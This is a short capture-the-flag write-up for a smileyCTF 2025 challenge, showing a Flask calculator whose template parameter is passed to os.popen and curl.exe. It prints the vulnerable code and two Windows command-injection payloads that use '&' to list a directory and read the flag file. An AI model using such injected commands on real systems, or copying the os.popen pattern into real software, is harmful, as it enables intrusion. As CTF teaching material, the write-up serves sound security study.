+++
title = 'smileyCTF 2025 - misc/ti-1983'
date = 2025-06-17T00:55:31-04:00
draft = false
+++



We're presented with a Flask web application that appears to be a calculator service. 

The calculor endpoint:
```python
def execute_code():
    code = request.values.get('code')
    output_tmpl = request.values.get('tmpl')
    if len(code) > 3 and any(c in code for c in "0123456789+*-/"):
        return render_error("This is a ~~Wendys~~ TI-84.")
```

Input code must be ≤3 characters or code cannot contain digits (0-9) or math operators (+*-/) if longer than 3 characters

User-provided `code` is inserted into `code_tmpl.py`. The code is executed in a sandboxed Python environment
The application uses `os.popen()` to execute curl with user-controlled input.

```python
url = f"{request.url_root}/static?{output_tmpl}.tmpl"
out_tmpl = os.popen(f"curl.exe -s {url}").read()
```

The `eval()` function runs with `{'__builtins__': {}}`, so we have no access to standard Python functions The URL construction allows us to inject OS commands.

The payload to list the directory contents:

```
/ti-84?code=""&tmpl=x.tmpl%26dir%26echo%20{{out}}
```
- `code=""` satisfies the length requirement (≤3 characters) and `tmpl=x.tmpl&dir&echo {{out}}` becomes part of the curl command. The `&` character acts as a command separator in Windows

```
Directory of C:\app
06/14/2025 04:29 AM    (33) flag_4dfa54cf005d9fea.txt
```

Final payload:

```
/ti-84?code=""&tmpl=x.tmpl%26type%20flag_4dfa54cf005d9fea.txt%26echo%20{{out}}
```

`.;,;.{command_injection_in_2025?}`